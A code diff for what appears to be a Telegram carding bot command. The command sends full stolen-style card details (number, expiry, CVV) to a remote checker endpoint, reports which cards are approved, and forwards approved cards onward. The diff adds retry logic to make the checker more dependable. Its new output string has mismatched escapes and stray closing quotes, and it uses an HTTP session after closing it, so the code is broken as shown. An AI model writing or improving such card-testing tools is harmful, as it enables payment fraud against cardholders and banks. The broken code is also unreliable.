@@ -41,35 +41,45 @@ async def chaos_cmd(Client, message):
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         endpoint_url = f"https://onyxenvbot.up.railway.app/chaos/key=yashikaaa/cc={fullcc}"
 
-        firstresp = f"\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"
+        firstresp = f"\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"
         msg = await message.reply_text(firstresp, quote=True)
 
-        secondresp = f"\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"
+        secondresp = f"\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"
         await asyncio.sleep(0.5)
         await msg.edit_text(secondresp)
 
         start = time.perf_counter()
-        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
         
-        try:
-            response_obj = await session.get(endpoint_url)
-            result_json = response_obj.json()
-            api_status = result_json.get("status", "Unknown").lower()
-            response = result_json.get("response", "No response message")
-            
-            if "approved" in api_status:
-                status = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-            elif "declined" in api_status or "failed" in api_status:
-                status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ✖️"
-            else:
-                status = api_status.upper()
-                
-        except httpx.RequestError as e:
-            status = "Error"
-            response = f"Request failed: {e}"
-        except ValueError:
-            status = "Error"
-            response = "Invalid JSON response"
+        # Retry logic to handle Railway cold-starts or connection issues
+        max_retries = 2
+        status = "Error"
+        response = "Request failed"
+        
+        async with httpx.AsyncClient(timeout=45, follow_redirects=True, limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)) as session:
+            for attempt in range(max_retries):
+                try:
+                    response_obj = await session.get(endpoint_url)
+                    result_json = response_obj.json()
+                    api_status = result_json.get("status", "Unknown").lower()
+                    response = result_json.get("response", "No response message")
+                    
+                    if "approved" in api_status:
+                        status = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+                    elif "declined" in api_status or "failed" in api_status:
+                        status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ✖️"
+                    else:
+                        status = api_status.upper()
+                    
+                    # If we got a real response, break the retry loop
+                    break
+                    
+                except (httpx.RequestError, ValueError) as e:
+                    if attempt == max_retries - 1:
+                        status = "Error"
+                        response = f"Request failed: {e}"
+                    else:
+                        await asyncio.sleep(1) # Wait a bit before retry
+                        continue
 
         getbin = await get_bin_details(cc)
 
@@ -82,7 +92,7 @@ async def chaos_cmd(Client, message):
         end = time.perf_counter()
         elapsed_time = round(end - start, 2)
 
-        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"
+        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\\n\\n━━━〔 META 〕━━━\\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \\n\\n━━━〔 OWNER 〕━━━\\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\\n\"\"\"
 
         await asyncio.sleep(0.5)
         await msg.edit_text(finalresp)
@@ -92,8 +102,6 @@ async def chaos_cmd(Client, message):
 
         if "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status or "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
             await sendcc(finalresp, session)
-
-        await session.aclose()
 
     except Exception:
         import traceback
